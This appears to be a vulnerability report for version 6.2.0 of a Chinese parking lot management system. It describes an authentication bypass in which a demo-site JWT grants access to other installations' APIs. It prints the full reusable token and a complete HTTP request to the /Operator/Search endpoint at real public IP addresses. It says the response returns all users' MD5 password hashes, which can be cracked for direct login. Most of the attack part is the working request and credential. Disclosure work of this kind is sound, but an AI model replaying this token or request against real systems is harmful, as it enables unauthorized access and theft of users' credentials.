[PRODUCT] 

 停车场管理系统   6.2.0

<img width="2151" height="977" alt="图片" src="https://github.com/user-attachments/assets/4a24daf9-013c-441e-93eb-436d4bbb361b" />




官网demo站：https://pms.demo.dasiot.cn/#/login
In the demo site can get token:
Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQTVMiLCJzdWIiOiJQTVMiLCJleHAiOjE3NDI1Mjc5MzcsInR5cGUiOjEsIm9wcnRObyI6ImFkbWluIiwib3BydE5hbWUiOiLotoXnuqfnrqHnkIblkZgiLCJtZXJjaGFudElkIjowLCJpUEFkZHJlc3MiOiIxNzIuMTY4LjgxLjI0MCIsImNyZWF0ZVRpbWUiOjAsInNzb1BsYXRmb3JtIjowLCJzc29Ub2tlbiI6bnVsbCwic3NvUmVmVG9rZW4iOm51bGwsIlNTT1VpZCI6bnVsbCwiYzNUZW5hbnRDb2RlIjpudWxsfQ==.9QiFBpkf5M0x5FXT9hUa8qDfHzCA580LBNLpqcnxwgw

[TYPE] 

Sensitive Data Exposure

[DESCRIPTION] 

A Sensitive Data Exposure  vulnerability exists in the " 停车场管理系统 ".The system's API  is vulnerable to unauthorized access.This vulnerability allows attackers to use historical tokens from the demo site to access the API in other websites and obtain account credentials of all users. No login is required—using only the demo site's token can bypass authentication and grant access to the interface. 

[DETAILS] 

Request package is as follows,the Token is  the demo site's history token.

```
POST /Operator/Search HTTP/1.1
Host: 119.39.97.210:8011
Content-Length: 82
OprtNo: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQTVMiLCJzdWIiOiJQTVMiLCJleHAiOjE3NDI1Mjc5MzcsInR5cGUiOjEsIm9wcnRObyI6ImFkbWluIiwib3BydE5hbWUiOiLotoXnuqfnrqHnkIblkZgiLCJtZXJjaGFudElkIjowLCJpUEFkZHJlc3MiOiIxNzIuMTY4LjgxLjI0MCIsImNyZWF0ZVRpbWUiOjAsInNzb1BsYXRmb3JtIjowLCJzc29Ub2tlbiI6bnVsbCwic3NvUmVmVG9rZW4iOm51bGwsIlNTT1VpZCI6bnVsbCwiYzNUZW5hbnRDb2RlIjpudWxsfQ==.9QiFBpkf5M0x5FXT9hUa8qDfHzCA580LBNLpqcnxwgw
Origin: http://58.51.255.164:8011
Referer: http://58.51.255.164:8011/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"pageSize":15,"pageIndex":1,"Filters":[{"Field":"SortName","Op":"=","Value":""}]}
```
<img width="2155" height="1187" alt="图片" src="https://github.com/user-attachments/assets/07db17e3-475a-4758-823c-64afa1eeae10" />


Unauthorized access allows obtaining all users' account credentials, which can be decrypted and used for direct login.
MD5 decryption
<img width="2157" height="617" alt="图片" src="https://github.com/user-attachments/assets/d0a4bee1-39ad-4e4e-989d-00f1380f5045" />








